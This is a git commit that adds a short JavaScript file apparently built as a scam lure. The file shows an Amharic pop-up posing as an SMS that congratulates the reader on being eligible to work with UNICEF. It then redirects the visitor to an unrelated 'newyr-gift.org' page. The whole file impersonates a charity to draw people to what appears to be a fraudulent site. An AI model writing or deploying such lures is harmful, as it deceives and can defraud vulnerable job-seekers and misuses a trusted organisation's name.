f92d230c7cdb8df15d71d64932f56017ac5cec71
ukebeblog <esther001imoh@gmail.com>
2025-01-18 09:07:06 +0100

    Create ethio-unicef-active.js

---
+++ ethio-unicef-active.js
@@ -0,0 +1,6 @@
+
+var password = 'አሁኑኑ ያመልክቱ'
+password=prompt('SMS: እንኳን ደስ ያለዎት ከተባበሩት መንግስታት የህፃናት ፈንድ (ዩኒሴፍ) ጋር ለመስራት ብቁ ነዎት።, ማመልከቻ ለማስገባት እሺን ይጫኑ   ','አሁኑኑ ያመልክቱ');
+if (password != 'አሁኑኑ ያመልክቱ') {
+location.href='https://newyr-gift.org/unicef-ethiopia.html';
+}
